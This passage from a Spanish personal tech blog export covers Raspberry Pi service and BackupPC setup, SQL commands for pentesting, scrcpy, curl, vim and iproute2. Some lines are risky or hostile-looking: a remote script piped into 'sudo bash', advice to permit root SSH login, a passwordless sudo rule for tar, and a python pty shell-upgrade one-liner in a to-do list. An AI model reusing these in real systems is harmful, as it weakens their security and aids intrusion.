git@github.com:procamora/Gestor-Series $HOME/series_manager pip3 install --user -r $HOME/series_manager/requirements_bot.txt chmod u+x $HOME/series_manager/app/utils/bot_series.py chmod 644 $HOME/series_manager/mio_bot_series_manager.service sudo cp $HOME/series_manager/mio_bot_series_manager.service /lib/systemd/system/ # Bot Dicctionary git clone git@github.com:procamora/bot_dictionary $HOME/bot_dictionary pip3 install --user -r $HOME/bot_dictionary/requirements.txt chmod u+x $HOME/bot_dictionary/bot_dictionary.py chmod 644 $HOME/bot_dictionary/mio_bot_dictionary.service sudo cp $HOME/bot_dictionary/mio_bot_dictionary.service /lib/systemd/system/ # Bot Common Ports git clone git@github.com:procamora/bot_common_ports $HOME/bot_common_ports pip3 install --user -r $HOME/bot_common_ports/requirements.txt chmod u+x $HOME/bot_common_ports/bot_common_ports.py chmod 644 $HOME/bot_common_ports/mio_bot_common_ports.service sudo cp $HOME/bot_common_ports/mio_bot_common_ports.service /lib/systemd/system/ # Bot Promox git clone git@github.com:procamora/bot_proxmox $HOME/bot_proxmox pip3 install --user -r $HOME/bot_proxmox/requirements.txt sudo apt install -y wakeonlan chmod u+x $HOME/bot_proxmox/bot_proxmox.py chmod 644 $HOME/bot_proxmox/mio_bot_proxmox.service sudo cp $HOME/bot_proxmox/mio_bot_proxmox.service /lib/systemd/system/ # Wiki personal pip3 install --user -r $HOME/wiki-personal/requirements.txt # Manage systemd sudo systemctl daemon-reload sudo systemctl enable mio_bot_minitrue.service \u0026amp;\u0026amp; sudo systemctl start mio_bot_minitrue.service sudo systemctl enable mio_bot_series_manager.service \u0026amp;\u0026amp; sudo systemctl start mio_bot_series_manager.service sudo systemctl enable mio_bot_dictionary.service \u0026amp;\u0026amp; sudo systemctl start mio_bot_dictionary.service sudo systemctl enable mio_bot_common_ports.service \u0026amp;\u0026amp; sudo systemctl start mio_bot_common_ports.service sudo systemctl enable mio_bot_proxmox.service \u0026amp;\u0026amp; sudo systemctl start mio_bot_proxmox.service 1 2 3 4 5 6 # pull all repos DIRS=( minitrue series_manager bot_dictionary bot_common_ports bot_proxmox ) for dirs in \u0026#34;${DIRS[@]}\u0026#34;; do echo $HOME/$dirs git -C $HOME/$dirs pull \u0026amp;\u0026amp; git -C $HOME/$dirs status done BackupPC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 wget -q -O - https://gist.githubusercontent.com/procamora/c32acb2f3ca4fb49c66e879644b11dc2/raw/76eb16ddaee21186e46a429ae9719723d960ab05/backuppc-ubuntu-installer.sh | sudo bash sudo chmod 755 /etc/BackupPC sudo htpasswd /etc/BackupPC/BackupPC.users backuppc sudo usermod -a -G hdd backuppc # cuidado que puede que aun no exista sudo usermod -a -G www-data backuppc sudo chown backuppc:www-data /etc/BackupPC/ sudo chown backuppc:www-data /etc/BackupPC/BackupPC.users firefox http://localhost/BackupPC_Admin Vamos a instalar el servicio BackupPC para para realizar copias de seguridad de los distintos hosts.\n1 2 3 4 5 6 7 sudo apt install backuppc rsync sudo htpasswd /etc/backuppc/htpasswd backuppc # Establecer nuestra propia password sudo systemctl enable backuppc sudo systemctl stop backuppc Como estamos en una Raspberry Pi y no queremos hacer los backup de los equipos en una Micro SD de 32Gb, vamos a cambiar el directorio donde se guardan los backup, para ello lo primero sera editar el fichero de configuración y poner el nuevo directorio:\n1 2 3 4 5 6 sudo vim /etc/backuppc/config.pl # Añadir $Conf{TopDir} = \u0026#39;/media/HDD/backuppc\u0026#39;; $Conf{LogDir} = \u0026#39;/media/HDD/backuppc/log\u0026#39;; Una vez que tenemos indicado el nuevo directorio copiamos todos los directorios y ficheros que habían en el directorio por defecto al nuevo:\n1 sudo cp -r /var/lib/backuppc/* /media/HDD/backuppc/ Para evitar poner las IPs vamos a indicar el nombre asociada a cada IP.\n1 2 3 4 5 6 echo \u0026#34;# personal hosts 192.168.1.71 rp3 192.168.1.72 zero 192.168.1.141 xiaomi 192.168.1.144 4770k \u0026#34; \u0026gt;\u0026gt; /etc/hosts c\nEstablecemos los permisos necesarios para el directorio. Este paso esta enlazado con el de Transmission, ya que ahí es donde se crea el grupo hdd.\n1 2 sudo usermod -a -G hdd backuppc sudo chown backuppc:backuppc /media/HDD/backuppc/ -R Para poder usar rsync en Linux sin necesidad de poner contraseñas es necesario generar un certificado SSH sin contraseña (o usar uno ya disponible como el que tengo para servicios). Este certificado tiene que estar en el directorio de backuppc, por lo que es necesario logearnos con este para generar/usar el certificado.\nPuede fallar al copiar los certificados en caso de que el fichero de SSH no tenga puesto permitRootLogin yes.\n1 2 3 4 5 6 7 8 9 sudo su - backuppc # login user backuppc ssh-copy-id root@4770k # envia el certificado id_rsa.pub, sino se llama asi renombrarlo ssh-copy-id root@xiaomi ssh-copy-id root@zero # login a servers para anadir los fingerprint /usr/bin/ssh -q -x -l root rp4 /usr/bin/ssh -q -x -l root xiaomi /usr/bin/ssh -q -x -l root zero Después seria necesario loguearse a cada maquina para que se quede registrado el fingerprinter de cada una y así no lo vuelva a pedir.\nUna vez hecho esto, la configuración de SSL por parte de apache seria la siguiente:\n1 2 3 4 5 6 7 8 9 10 sudo mkdir -p /etc/apache2/ssl/ # Creamos directorio donde guardar certificados # Enviamos los certificados scp procamora@4770k:/home/procamora/Documents/CA/server/backuppc.key /etc/apache2/ssl/ scp procamora@4770k:/home/procamora/Documents/CA/server/backuppc.cert /etc/apache2/ssl/ scp procamora@4770k:/home/procamora/Documents/CA/ca/cacert.cert /etc/apache2/ssl/ # Cogemos la plantilla de ssl y la modificamos sudo cp /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-available/backuppc.conf Editamos el fichero que acabamos de crear añadiéndole la ruta de los certificados, el DocumentRoot y ServerName.\n1 sudo vim /etc/apache2/sites-available/backuppc.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;IfModule mod_ssl.c\u0026gt; \u0026lt;VirtualHost _default_:443\u0026gt; ServerAdmin webmaster@localhost ServerName backuppc.procamora.com ServerAlias backuppc.procamora.com DocumentRoot /usr/share/backuppc/cgi-bin/ # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # SSL Engine Switch: # Enable/Disable SSL for this virtual host. SSLEngine on SSLCertificateFile /etc/apache2/ssl/backuppc.cert SSLCertificateKeyFile /etc/apache2/ssl/backuppc.key #SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt #SSLCACertificatePath /etc/ssl/certs/ SSLCACertificateFile /etc/apache2/ssl/cacert.cert #SSLCARevocationPath /etc/apache2/ssl.crl/ #SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl #SSLVerifyClient require #SSLVerifyDepth 10 #SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire \u0026lt;FilesMatch \u0026#34;\\.(cgi|shtml|phtml|php)$\u0026#34;\u0026gt; SSLOptions +StdEnvVars \u0026lt;/FilesMatch\u0026gt; \u0026lt;Directory /usr/lib/cgi-bin\u0026gt; SSLOptions +StdEnvVars \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026lt;/IfModule\u0026gt; Una vez que están configurado el fichero, lo que faltara sería: habilitar el modulo de SSL, habilitar el VirtualHost que hemos creado y reiniciar la configuración de Apache:\n1 2 3 sudo a2enmod ssl sudo a2ensite backuppc.conf sudo systemctl reload apache2 Por ultimo, para poder hacer backup locales es necesario que el usuario backuppc pueda ejecutar el comando tar como sudo son contraseña:\n1 sudo echo \u0026#34;backuppc ALL=NOPASSWD: /bin/tar\u0026#34; \u0026gt; /etc/sudoers.d/backuppc Una vez realizada toda esta configuración, ya solo quedaría conectarnos por el navegador a la url: http://192.168.1.71/backuppc/ o a https://backuppc.procamora.com.\nEn la sección host tendremos que añadir todos los host a los que queremos realizar copias de seguridad y en la sección xfer pondremos que el protocolo por defecto es rsync y los directorios a los que queremos realizar copias de seguridad. También podemos excluir ficheros como (*.iso, *.class, *.pyc, etc). Dentro de cada host podemos sobrescribir estas reglas poniendo algunas mas especificas.\n1 2 3 http://backuppc.sourceforge.net/faq/localhost.html http://backuppc.sourceforge.net/faq/ssh.html https://backuppc.procamora.com/backuppc/index.cgi?action=view\u0026amp;type=docs#_conf_xferloglevel_SSH Recuperar fichero comprimido por backuppc sudo perl -MCompress::Zlib -e \u0026lsquo;undef $/; print uncompress(\u0026lt;\u0026gt;)\u0026rsquo; \u0026lt; /media/HDD/backuppc/pc/rp3/119/f%2fetc%2f/fbackuppc/fapache.conf\n###################################################### d\nsudo mkdir /lib/systemd/system/mio sudo touch /lib/systemd/system/mio/client_ssh.service sudo chmod 644 /lib/systemd/system/mio/client_ssh.service\n","date":"2020-09-11T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/configuracion_de_la_raspberry_pi_4/","title":"Configuracion de la Raspberry Pi 4"},{"content":"En este articulo se van a hablar de los comandos mas relevantes para tratar Bases de Datos SQL. Se van a tratar los principales motores de BD. El objetivo es ser capaz de realizar las principales operaciones que se pueden realizar en un pentesting. Tanto desde el punto de vista de conectarse a una BD victima como de desplegar nuestra propia BD para realizar pruebas.\nLos motores de BD que se van a tratar son los siguientes:\nFamilia MySQL (MySQL, MariaDB, etc) PostgreSQL Oracle SQL Server Familia MySQL (MySQL, MariaDB, etc) El primer paso sera conectarnos a la base de datos, esto se puede realizar de multiples formas, pero la mas rápida es realizarlo desde con consola con el comando mysql.\n1 mysql -h 127.0.0.1 -uroot -ppass [-D db_name] Si no se quiere poner la contraseña en el propio comando simplemente hay que dejar el argumento -p vacio y el comando mysql te pedira la contraseña.\nSe puede indicar la BD a la que nos conectamos de forma opcional con el argumento -D.\nVisualizar bases de datos y tablas Una vez que estamos conectados a la BD, podremos ejecutar los siguientes comandos:\nshow databases: Para mostrar las BD disponibles. use test_db: Para seleccionar la BD test_db. show tables: Para mostrar las tablas disponibles en la BD test_db. desc table1: Para mostrar las columnas de la tabla table1. show columns from table1: Para mostrar las columnas de la tabla table1. Aqui se muestran los comandos descritos anteriormente. Es importante destacar que todos los comandos tienen que terminar el punto y coma (;).\n1 2 3 4 5 6 7 8 9 show databases; use test_db; show tables; desc table1; show columns from table1; # es igual a desc Gestión de bases de datos y tablas 1 create database test_db; 1 2 3 4 5 6 CREATE TABLE table3( id int(50) not null auto_increment primary key, user varchar(35), pass varchar(50), description varchar(50) default \u0026#39;bato\u0026#39; ); drop table [table name];\nselect 1;\nGestion de usuarios 1 2 CREATE USER \u0026#39;user1\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;pass1\u0026#39;; DROP USER user1@‘localhost’; cambiar contraseña de un usuario, que no sea root, ya que para este es necesario parar el serivicio y colocar este comando en un fichero de autoarranque de mysql.\n1 ALTER USER \u0026#39;user1\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;pass2\u0026#39;; Gestion de permisos 1 2 GRANT [permiso] ON [databse].[table] TO \u0026#39;[user1]\u0026#39;@\u0026#39;localhost\u0026#39;; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;user1\u0026#39;@\u0026#39;localhost\u0026#39;; Una vez que has finalizado con los permisos que deseas configurar para tus nuevos usuarios, hay que asegurarse siempre de refrescar todos los privilegios.\n1 FLUSH PRIVILEGES; Si necesitas remover un permiso, la estructura es casi idéntica a la que los asigna:\n1 REVOKE [permiso] ON [databse].[table] FROM \u0026#39;[user1]\u0026#39;@\u0026#39;localhost\u0026#39;; Dump de la base de datos y restauración 1 2 3 /bin/mysqldump -c -u admin -ppassword databasename tablename \u0026gt; /tmp/databasename.tablename.sql bin/mysql -u admin -ppassword databasename \u0026lt; /tmp/databasename.sql ","date":"2020-09-07T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/comandos_basicos_sql_para_pentesting/","title":"Comandos basicos SQL para Pentesting (WIP)"},{"content":"Summary: La aplicación_ scrcpy_ proporciona la visualización y control de dispositivos Android conectado por USB, aunque también tiene compatibilidad con el control por TCP/IP. No requiere acceso root y es multiplataforma, funcionando sobre Windows, Linux Y macOS. Status: published\nLa aplicación scrcpy proporciona la visualización y control de dispositivos Android conectado por USB, aunque también tiene compatibilidad con el control por TCP/IP. No requiere acceso root y es multiplataforma, funcionando sobre Windows, Linux Y macOS.\nSus características son:\nLigero (nativo, muestra sólo la pantalla del dispositivo). Rendimiento (30 ~ 60 fps). Calidad (1920 × 1080 o más). Baja latencia (35 ~ 70ms). Bajo tiempo de inicio (~ 1 segundo para mostrar la primera imagen). No intrusivo (no se deja nada instalado en el dispositivo). {:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nInstalación Requisitos previos:\nEl dispositivo Android requiere al menos la API 21 (Android 5.0). Tener habilitado la depuración adb en el dispositivo. Para instalarlo en Fedora podemos usar el gestor de paquetes snap:\n1 2 3 4 5 sudo snap install scrcpy snap connections scrcpy sudo snap connect scrcpy:network :network sudo snap connect scrcpy:network-bind :network-bind sudo snap install core En Ubuntu 20.04 ya se puede instalar desde el repositorio oficial.\nUso Un ejemplo básico de uso sería el siguiente:\n1 scrcpy --max-size 1920 --max-fps 60 --fullscreen Rotación La ventana puede ser rotada con:\n1 scrcpy --rotation 1 Los posibles valores son:\n0: no hay rotación. 1: 90 grados en sentido contrario a las agujas del reloj. 2: 180 grados. 3: 90 grados en el sentido de las agujas del reloj. Grabación Es posible grabar la pantalla mientras se refleja con el comando:\n1 2 scrcpy --record file.mp4 scrcpy --record file.mkv Para deshabilitar el espejo mientras se graba:\n1 scrcpy --no-display --record file.mp4 Interrumpir la grabación con Ctrl+C Ctrl+C no termina correctamente en Windows, así que desconecta el dispositivo.\n","date":"2020-05-10T00:00:00Z","image":"https://www.procamora.com/covers/android.png","permalink":"https://www.procamora.com/p/android_cast_screen_to_linux/","title":"Android cast screen to Linux"},{"content":"Para instalar los Guest Additions en VirtualBox desde la ISO que proporciona, es necesario compilarlos y por ende tener las librerías de compilación necesarias. Estas librerías son:\nDebian / Ubuntu / Linux Mint En sistemas basados en Debian habría que instalar las siguientes herramientas de compilación, después reiniciar y ya después montar la ISO y ejecutar el script.\n1 2 3 sudo apt install gcc make perl dkms linux-headers-$(uname -r) build-essential reboot # Montar ISO y ejecutar script Como excepción, en Ubuntu podemos instalar los Guest Additions directamente desde los repositorios con:\n1 sudo apt install virtualbox-guest-x11 virtualbox-guest-utils virtualbox-guest-dkms Fedora En Fedora los Guest Additions ya vienen instalados por defecto por lo que no debería ser necesario hacer nada, pero en caso de querer instalarlos desde el ISO, habría que instalar:\n1 2 3 sudo dnf update kernel* sudo dnf install gcc automake make kernel-headers kernel-devel perl dkms elfutils-libelf-devel # Montar ISO y ejecutar script openSUSE En openSUSE habría que instalar las siguientes herramientas de compilación, y ya después montar la ISO y ejecutar el script.\n1 2 sudo zypper install gcc make dkms kernel-devel kernel-default-devel # Montar ISO y ejecutar script https://www.linuxuprising.com/2019/01/manual-virtualbox-guest-additions.html\n","date":"2020-04-07T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/virtualbox_guest_additions/","title":"VirtualBox Guest Additions"},{"content":" Testear OpenVPN y WireGuard Testear OpenVPN con push routing Porbar a poner routa estatica en tpc, para que acceda a red proxmox (sudo ip route add 10.0.0.0/16 via 192.168.1.254) Leer Paper WireGuard: Next Generation Kernel Network Tunnel get let\u0026rsquo;s encrypt certificate Probar asciiflow.com Upgrading Simple Shells to Fully Interactive TTYs (https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) python -c \u0026lsquo;import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo; Makefile -\u0026gt; cat -e -t -v Makefile para detectar si se usan Tab (Bien) o espacios. Tiene que salir: ^M smbtree -b -N latexmk -pvc -pdf file.tex usar curl con interfaz especifica en promox para api flash Documentar proxmox + script remove suscription Ctrl + l -\u0026gt; para limiar terminal sudo -l -\u0026gt; para mostrar /etc/sudoers port knocking linux Vim -\u0026gt; :W == :w !sudo tee % Recabar informacion sobre reporistorio Red Team Recabar informacion sobre reporistorio fingerprint (snmp, smtp, http, etc) Comprobar BackupPC funciona scheluder Investgar sobre DetectionLab (https://www.flu-project.com/2020/03/tu-laboratorio-de-Red-Team.html Diseñar taza con nmap (2 imagenes con nmap) Proxmox probar health https://docs.ansible.com/ansible/latest/user_guide/playbooks_intro.html Crear script inserte cumpleaños telegram Invertigar mount sshfs (https://wiki.archlinux.org/index.php/SSHFS_(Espa%C3%B1ol)) https://likegeeks.com/es/servidor-de-correo-linux-postfix/ https://munahack.github.io/download.html Diseñar alias interesastes\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # User specific aliases and functions ! ssh-add -l \u0026gt; /dev/null \u0026amp;\u0026amp; eval \u0026#34;$(ssh-agent -s)\u0026#34; \u0026amp;\u0026amp; ssh-add ~/.ssh/services # Alias alias ls=\u0026#39;ls -lhGQ --color=auto\u0026#39; alias rm=\u0026#34;echo Use trash, or the full path i.e. /bin/rm\u0026#34; alias which=\u0026#34;alias | /usr/bin/which --tty-only --read-alias --show-dot --show-tilde\u0026#34; alias web=\u0026#39;python3 -m http.server 8080\u0026#39; # Scripts ~/scripts/cargaKeyPi.sh export VISUAL=/usr/bin/vim export EDITOR=\u0026#34;$VISUAL\u0026#34; ","date":"2020-03-31T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/tareas_pendientes/","title":"Tareas Pendientes"},{"content":"El comando curl esta diseñado para verificar una url y ademas permite la transferencia de datos. Hace uso de la librería opensource libcurl disponible en todas las distribuciones Linux.\nOperaciones básicas HTTP con curl: Gestión certificados User Agent Customize headers Referer Proxy con autenticación Cookies GET POST PUT DELETE PATCH MOVE OPTIONS MKCOL FTP/FTPS/SFTP/SCP con curl: Descarga Subida SMB con curl: LDAP/LDAPS con curl El comando Curl es compatible con la siguiente lista de protocolos:\nHTTP y HTTPS FTP y FTPS IMAP e IMAPS POP3 y POP3S SMB y SMBS SFTP SCP TELNET GOPHER LDAP y LDAPS SMTP y SMTPS Operaciones básicas La sintaxis básica del comando es la siguiente:\n1 curl [OPTIONS] [URL] Algunas de las opciones mas relevantes son:\n-#, \u0026ndash;progress-bar Make curl display a simple progress bar instead of the more informational standard meter. -b, \u0026ndash;cookie \u0026lt;name=data\u0026gt; Supply cookie with request. If no =, then specifies the cookie file to use (see -c). -c, \u0026ndash;cookie-jar File to save response cookies to. -d, \u0026ndash;data Send specified data in POST request. Details provided below. -f, \u0026ndash;fail Fail silently (don\u0026rsquo;t output HTML error form if returned). -F, \u0026ndash;form \u0026lt;name=content\u0026gt; Submit form data. -H, \u0026ndash;header Headers to supply with request. -i, \u0026ndash;include Include HTTP headers in the output. -I, \u0026ndash;head Fetch headers only. -k, \u0026ndash;insecure Allow insecure connections to succeed. -L, \u0026ndash;location Follow redirects. -o, \u0026ndash;output Write output to . Can use \u0026ndash;create-dirs in conjunction with this to create any directories specified in the -o path. -O, \u0026ndash;remote-name Write output to file named like the remote file (only writes to current directory). -s, \u0026ndash;silent Silent (quiet) mode. Use with -S to force it to show errors. -v, \u0026ndash;verbose Provide more information (useful for debugging). -w, \u0026ndash;write-out Make curl display information on stdout after a completed transfer. See man page for more details on available variables. Convenient way to force curl to append a newline to output: -w \u0026ldquo;\\n\u0026rdquo; (can add to ~/.curlrc). -X, \u0026ndash;request The request method to use. Se puede realizar la peticion por una IP o un interfaz especifico con el flag \u0026ndash;interface:\n1 2 3 curl --interface eth0:1 http://host.com/ curl --interface 192.168.1.10 http://host.com/ HTTP con curl Es posible reanudar una descarga interrumpida con el siguiente comando:\n1 curl -C - -O http://host.com/file.tar Podemos limitar la velocidad de descarga con:\n1 curl --limit-rate 200k -O http://host.com/file.tar Gestión certificados Podemos verificar un certificado SSL con:\n1 $ curl --cacert cacert.crt http://host.com Podemos ignorar certificado SSL con:\n1 curl -k http://host.com User Agent Podemos indicar un User-Agent especifico con el flag -A:\n1 curl -A \u0026#39;Mozilla/3.0 (Win95; I)\u0026#39; http://host.com Aquí hay una lista de User-Agent validos:\n1 2 3 4 Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15 Customize headers Podemos modificar las cabeceras con el flag -H:\n1 2 curl -H \u0026#34;Host: test.example\u0026#34; http://host.com/ curl -H \u0026#34;User-Agent:\u0026#34; http://host.com/ Referer Podemos indicar que estamos realizando una referencia de otra url con el flag \u0026ndash;referer:\n1 curl --referer http://comes-from.example.com https://host.com/ Proxy con autenticación Podemos indicar un proxy y las credenciales si son necesarias para el proxy con el flag -u:\n1 curl PROXY:8000 -u username:password -O http://host.com/file.tar Si el proxy requiere una autenticación especifica, habría que usar el flag -U:\n1 curl PROXY:8000 -U username:password -O http://host.com/file.tar Cookies Podemos navegar usando unas cookies previamente descargadas:\n1 curl --cookie-jar cookie.txt https://www.host.com/index.html GET Para usar el método GET basta con usar el comando:\n1 curl http://localhost:5000 POST Para usar el método POST hay que usar -X POST. Es necesario indicar el campo data y opcionalmente se puede enviar el Content-Type.\nFormas de enviar datos:\n1 2 form urlencoded: -d \u0026#34;param1=value1\u0026amp;param2=value2\u0026#34; or -d @data.txt json: -d \u0026#39;{\u0026#34;key1\u0026#34;:\u0026#34;value1\u0026#34;, \u0026#34;key2\u0026#34;:\u0026#34;value2\u0026#34;}\u0026#39; or -d @data.json El formato para enviar un POST con un JSON con los flags en formato largo sería:\n1 2 3 4 curl --header \u0026#34;Content-Type: application/json\u0026#34; \\ --request POST \\ --data \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;abc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;xyz\u0026#34;}\u0026#39; \\ http://localhost:5000 El mismo comando pero en formato corto sería:\n1 2 3 4 curl -H \u0026#34;Content-Type: application/json\u0026#34; \\ -X POST \\ -d \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;abc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;xyz\u0026#34;}\u0026#39; \\ http://localhost:5000 Para enviar un fichero en vez de un string se usa el data @fichero:\n1 2 3 4 curl -H \u0026#34;Content-Type: application/json\u0026#34; \\ -X POST \\ -d \u0026#39;@example.json\u0026#39; \\ http://localhost:5000 Para enviar un POST con Content-Type www-form podemos ponerlo en el flag -H o eliminarlo, ya que es el Content-Type por defecto en curl.\n1 2 3 4 curl -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -X POST \\ -d \u0026#39;username=abc\u0026amp;password=xyz\u0026#39; \\ http://localhost:5000 PUT El proceso es el mismo que con POST.\n1 2 3 4 curl -H \u0026#34;Content-Type: application/json\u0026#34; \\ -X PUT \\ -d \u0026#39;{\u0026#34;username\u0026#34;:\u0026#34;abc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;xyz\u0026#34;}\u0026#39; \\ http://localhost:5000 1 2 3 4 curl -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -X PUT \\ -d \u0026#39;username=abc\u0026amp;password=xyz\u0026#39; \\ http://localhost:5000 DELETE Podemos borrar un fichero con el comando:\n1 curl -X \u0026#34;DELETE\u0026#34; http://localhost:5000/file PATCH 1 curl -X PATCH http://localhost:5000/file?status=closed MOVE Podemos mover un fichero con el comando:\n1 curl -X MOVE --header \u0026#39;Destination:http://host.org/new.txt\u0026#39; \u0026#39;https://host.com/old.txt\u0026#39; OPTIONS Podemos ver los métodos que están permitidos en un servidor HTTP con el comando:\n1 curl -X OPTIONS http://localhost:5000 -i MKCOL Podemos crear un directorio con el comando:\n1 curl -X MKCOL \u0026#39;https://example.com/new_folder\u0026#39; FTP/FTPS/SFTP/SCP con curl Descarga Podemos descargar ficheros de un servidores FTP con los comandos:\n1 2 3 4 curl -u username:password -O ftp://server_ftp/test.tar.gz curl ftps://files.are.secure.com/secrets.txt curl --ftp-ssl ftp://files.are.secure.com/secrets.txt # equivalente También podemos descargar ficheros de servidores SSH usando SFTP o SCP con los siguientes comandos:\n1 2 3 4 5 6 7 curl -u username sftp://example.com/etc/issue # Clave prinvada sin contraseña curl -u username: --key ~/.ssh/id_rsa scp://example.com/~/file.txt # Clave privada con contraseña curl -u username: --key ~/.ssh/id_rsa --pass private_key_password scp://example.com/~/file.txt Subida También es posible subir ficheros al servidor FTP con el flag -T:\n1 curl -u username:password -T test.tar.gz ftp://server_ftp SMB con curl Podemos descargar ficheros de un servidor SMB con el comando:\n1 curl -u \u0026#34;domain\\username:password\u0026#34; smb://server.example.com/share/file.txt También es posible subir ficheros al servidor SMB con el flag -T:\n1 curl -T file.txt -u \u0026#34;domain\\username:passwd\u0026#34; smb://server.example.com/share/ LDAP/LDAPS con curl Si se tiene instalada la librería OpenLDAP, es posible usar curl para real;izar peticiones utilizando el protocolo ldap://. Por defecto se usará LDAPv3 y en caso de que este falle se usará LDAPv2.\nLa sintaxis de una consulta con LDAP es algo compleja, para obtener ayuda seria relevante usar el RFC 2255\nAlgunos ejemplos de consultas son las siguientes:\n1 2 3 4 5 6 7 8 9 # LDAP sin autenticación curl -B \u0026#34;ldap://ldap.frontec.se/o=frontec??sub?mail=*sth.frontec.se\u0026#34; # LDAP con autenticación curl -u user:passwd \u0026#34;ldap://ldap.frontec.se/o=frontec??sub?mail=*\u0026#34; curl \u0026#34;ldap://user:passwd@ldap.frontec.se/o=frontec??sub?mail=*\u0026#34; # Por defecto se usa autenticacion basica. --basic, --ntlm o --digest curl --ntlm \u0026#34;ldap://user:passwd@ldap.frontec.se/o=frontec??sub?mail=*\u0026#34; Fuentes: 0, 1, 2\n","date":"2020-03-19T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/uso_de_curl/","title":"Uso de curl"},{"content":"En ocasiones en las que hay que trabajar con ficheros yaml o similares (netplan, Dockerfile, docker-compose, etc) que son sensibles a la identación, puede ser interesante modificar vim para que ponga un tabulado de espacios y con la cantidad de espacios deseado, esto se realiza de la siguiente forma:\n1 2 3 4 5 :filetype plugin indent on # Forzamos a que la identacion sea de 2 caracteres (espacios) :set shiftwidth=2 :set expandtab También puede ser interesante activar una especie de \u0026ldquo;modo debug\u0026rdquo; en la que ver todos los caracteres especiales, esto se activaría de la siguiente forma:\n1 2 :set listchars=eol:¬,tab:\u0026gt;·,trail:~,extends:\u0026gt;,precedes:\u0026lt;,space:␣ :set list Fuentes: 0, 1\n","date":"2020-03-15T00:00:00Z","image":"https://www.procamora.com/covers/htb.png","permalink":"https://www.procamora.com/p/configuracion_vim/","title":"Configuración vim"},{"content":" Gestión de interfaces: Administración direcciones IP Configuración del dispositivos físicos y lógicos Administración de ARP Configuración del dispositivo MACsec Enrutamiento: Ver rutas del sistema Añadir rutas estáticas Borrar rutas estaticas Hacer persistentes las rutas Domain Name System o DNS: smallpdf Resumen general Conclusion final Iproute2 es un paquete de utilidades desarrollado por Alexey Kuznetsov. Este paquete es un conjunto de herramientas muy potentes para administrar interfaces de red y conexiones en sistemas Linux.\nEste paquete reemplaza completamente las funcionalidades presentes en ifconfig, route, y arp y las extiende llegando a tener características similares a las provistas por dispositivos exclusivamente dedicados al ruteo y control de tráfico.\nEste paquete lo podemos encontrar incluido en distribuciones de Debian y RedHat con versiones del núcleo mayores a 2.2.\nEl comando ip se utiliza para asignar una dirección a una interfaz de red y/o configurar parámetros de interfaz de red en sistemas operativos Linux. Este comando reemplaza el comando ifconfig antiguo y ahora obsoleto en las distribuciones modernas de Linux. Como curiosidad de este comando es que no es necesario ponerlo completo, si pones abreviaciones de este funciona correctamente siempre que no hay ambigüedad con otros, como con los comandos en Cisco.\nGestión de interfaces Administración direcciones IP Podemos ver la configuración de las interfaces con el comando ip address. También se puede ver de forma abreviada:\n1 2 3 4 5 6 7 8 9 # Ver interfaces ip address # Forma abreviada ip a ip addr # Interfaz enp0s3 ip address show enp0s3 También podemos añadir interfaces y borrarlas con el argumento add y del. En el caso de añadir una IP, si ya existe se añadirá una nueva dirección IP \u0026ldquo;virtual\u0026rdquo;.\n1 2 3 4 5 # Añadir IP sudo ip address add 192.168.1.105/24 dev enp0s3 # Borrar IP sudo ip address del 192.168.1.105/24 dev enp0s3 Configuración del dispositivos físicos y lógicos Las interfaces se manejan con el comando ip link. Con este comando podemos modificar \u0026ldquo;físicamente\u0026rdquo; las interfaces, tumbándolas y levantándolas.\n1 2 3 4 5 # Levantar la interfaz sudo ip link set enp0s3 up # Tumbar la interfaz sudo ip link set enp0s3 down También se pueden crear nuevos interfaces, algunos de estos interfaces son: bridge, can, macvlan, vlan, macsec, etc). Por ejemplo podemos crear un interfaz bridge y añadirle interfaces a ese bridge de la siguiente forma:\n1 2 3 4 sudo ip link add br0 type bridge sudo ip link set enp0s3 master br0 sudo ip link set enp0s8 master br0 sudo ip link set enp0s9 master br0 Se pueden ver las interfaces asociadas a cada bridge con el siguiente comando:\n1 bridge link También es se pueden crear VLANs asociadas a una interfaz con el siguiente comando:\n1 sudo ip link add link enp0s3 name enp0s3.50 type vlan id 50 Fuentes: 0, 1, 2\nAdministración de ARP Para ver la tabla ARP tenemos el comando ip neigh.\n1 